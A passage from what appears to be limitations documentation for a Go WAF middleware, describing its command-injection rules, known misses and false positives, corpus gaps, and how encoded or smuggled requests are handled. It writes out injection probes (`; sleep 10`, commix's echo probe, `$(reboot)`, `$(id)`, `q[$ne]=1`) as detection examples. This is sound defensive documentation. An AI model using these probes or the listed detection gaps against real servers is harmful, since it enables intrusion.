  - *`x; sleep 10`.* alpha.5 cleared a single plain token before `; sleep N`. alpha.6 catches it again when the whole prefix is one ASCII letter or a run of digits (`x; sleep 10`, `1; sleep 5`, `42; sleep 10`): no note is a lone letter or number followed by `; sleep N` and nothing else. `Mon; sleep 8`, `Mo; sleep 8`, `Gate 2; sleep 10` and `Room 5; sleep 8` stay clear. **Still missed:** a prefix of two or more letters (`ab; sleep 10`) or a word and a number (`x 1; sleep 5`).
- **Command injection recall: `$(...)`, `$((...))` and `echo` probes.** A `$(` substitution used to count only when the word inside was a listed command, so commix's default probe (`;echo TOKEN$((46+17))$(echo TOKEN)TOKEN`) and `$(echo hi)` were missed. From alpha.6 a `$(` followed by a word that starts with a letter or `_` and a closing `)`, and a `$((` arithmetic body (identifiers, digits, blanks and `+ - * / %`) closed by `))`, are flagged whatever the word: `$(echo hi)`, `x$(foo)`, `a $(foo bar) b`, `$((1+2))`. The scan reads at most 128 non-blank bytes (blank padding does not count: `$(echo` then 130 blanks then `)` is caught) and stops at the next `(` or line break, so `$($($(...`, a long unclosed `$(` and blank padding stay linear. `echo` right after `;`, `|`, `&&` or `||` is flagged when its argument starts with a variable or substitution (`$` then a letter, `_`, `{`, `(` or `?`), a backtick or a quote (`; echo $HOME`, `| echo 'x'`, ``||echo `id` ``, `x; echo "hi"`). After a lone ` & ` it never counts, and after `; ` that ends a prose sentence or follows one plain word a quote does not count (`see you; echo "hi"`, `Mon; echo "hi"`, `Yes; echo "same"`). Clear: a digit after `$(` (`Total $(5)`, `US$(10)`, `$(45.00)`, the accounting negative `$(1,234.56)`); a dollar amount in prose, where `$(` is at the start of the value or after a blank or `(`, holds one letter-only word and is followed by the end, a blank or punctuation (`costs $(approx) 5`, `($(approx) 5)`, `$(amount) due`, and so also `$(document).ready(fn)`); `Price ($5)` and `$5 (usd)` (no `$(`); `echo` as a word or with an amount (`Echo Park; echo of the past`, `Mon; echo hi`, `Ok; echo $5 back`). A listed command in that prose shape is still caught, any case, including `reboot`, `halt`, `poweroff`, `shutdown`, `env`, `printenv` and `hostname`, which count only inside `$(...)` (`x $(reboot)`, `a $(hostname) b`, `x $(Reboot)`, `a $(id) b`). **Missed:** an unlisted letter-only word in that prose shape (`a $(foo) b`, `$(foo)`), and a substitution with a line break inside (`$(echo` newline `hi)`). **New false positives, accepted as code-like text:** a closed substitution or an `echo $`/quote after an operator in shell snippets (tldr-style command lines such as `eval "$(tool init bash)"` and `ls $(pwd)`, fenced shell blocks in READMEs and issues, inline code spans with a substitution in technical prose such as ``set it to `$(go env GOARCH)` first``); jQuery calls with more than one bare name (`$(this.el).hide() not working`); arithmetic in shell syntax (`$((a+b)) is the sum`); and prose amounts with two tokens or a dot inside (`costs $(about 5)`, `around $(approx. 50)`). In the external benign set no natural-language value outside a code span or quoted command is newly flagged. Fields that carry shell snippets need an exclusion or a typed policy.

### The four corpus misses

Both corpus gates pass with these requests still allowed (see [`testdata/corpus/README.md`](../testdata/corpus/README.md)):

1. **Content-type abuse on a `GET` with no body** (`Content-Type: application/x-evil-type`). The content-type allow-list applies only to requests with a body; with no body nothing parses the header.
2. **An operator inside a query value, not a key** (`q=[$ne]=1`). As a value it is inert text; the real shape (`q[$ne]=1`) is caught.
3. **XPath injection.** There is no XPath detector in v0.1 and libinjection does not flag it.
4. **An obfuscated `jndi` lookup in `X-Api-Version`** in the generic configuration only: that header is not scanned unless listed in `inspect_headers` (the API-aware corpus policy lists it). Only `User-Agent`, `Referer`, cookies and headers you list are scanned.

### Information in a match

- `Match.Snippet` is at most 64 bytes of the offending value, with control, format and bidi characters replaced. `Match.Field` can carry up to 256 attacker-chosen bytes of key text (a query key, a JSON path, a cookie name), sanitised the same way. Treat both as untrusted when you log or display them; never put them in a header or an HTML page unescaped.

### Servers and encodings

- **Smuggling headers on fasthttp.** fasthttp normalises the dangerous header combinations before the middleware runs: with both `Transfer-Encoding` and `Content-Length` it keeps `Transfer-Encoding`, duplicate `Content-Length` collapses to the last value, duplicate `Transfer-Encoding` to the first, and `xchunked` is rejected. The `AEG-PROTO` smuggling rules are a backstop there (and behind proxies that forward such headers differently). net/http neutralises the TE.CL variants itself.
- **`Content-Encoding` on Fiber.** The adapter inspects what `c.Body()` returns, and Fiber decodes `gzip`, `deflate` and `br` there, so a compressed attack is inspected decompressed. Stacked supported codings (`gzip, gzip`) are decoded in turn. A list that starts with a coding Fiber does not know (`identity, gzip`) gives an empty `Body()`, so the engine and `BodyParser` both see nothing; a decode error gives the error text, which is what both see. Codings Fiber does not decode (`x-gzip`, upper-case `GZIP`, `zstd`) are left encoded: the engine sees compressed bytes, the JSON parse fails and the NUL bytes in the compressed data are blocked as `AEG-LFI-001`. A handler that decodes the raw body itself (`c.Request().Body()`) would see data Aegolith did not.
- **`Content-Encoding` on net/http.** net/http never decodes request bodies, and neither does the `httpwaf` middleware. A compressed body is inspected as compressed bytes: in enforce mode a gzip request body is normally blocked (`AEG-PROTO-020`, then `AEG-LFI-001` for the NUL bytes), and an attack inside it is not seen as text. Decoding after the WAF (a decompression middleware placed inside Aegolith, or a handler calling `gzip.NewReader(r.Body)`) is not supported. If you must accept compressed request bodies, decode them in a middleware placed *before* Aegolith, bounded in decoded size.
- **Recommendation for both servers.** API routes rarely need compressed request bodies: reject any request `Content-Encoding` other than `identity` at the proxy or in a small middleware in front of Aegolith.
- **Decompression bombs.** The only bound is Fiber's `BodyLimit` on the compressed size. Set it to the largest compressed upload you accept and expect up to roughly 1000x expansion.
- **What the middleware reads.** The net/http middleware inspects the first `MaxBodyBytes + 1` bytes of the body; the Fiber adapter copies up to `2 * MaxBodyBytes + 1` (see [Resource bounds](#resource-bounds)). The body is read before the decision, so an `Expect: 100-continue` request has its `100 Continue` sent before a block can be decided. The handler still receives the complete original stream.

## Tests that back this up

- A corpus of 152 attacks and 154 legitimate requests, run twice (no policy, and a policy that types the fields) with no exclusions. See the [README](../README.md#corpus-results).
- Per-detector unit tests with the false-positive shapes beside each rule, including the accepted-recall negatives above.
- Fuzz targets for `Inspect`, the JSON walker, the value decoder and the `uuid_lenient` grammar (checked against an independent regular expression) (`make fuzz-quick`).
- Linear-time and scan-budget tests for adversarial inputs (long values, invalid UTF-8, deep or wide JSON), and a latency budget run (`make perf`).
- `go test -race` across both modules.

None of this is a proof. See [CONTRIBUTING.md](../CONTRIBUTING.md) for how to add a case when you find a gap.
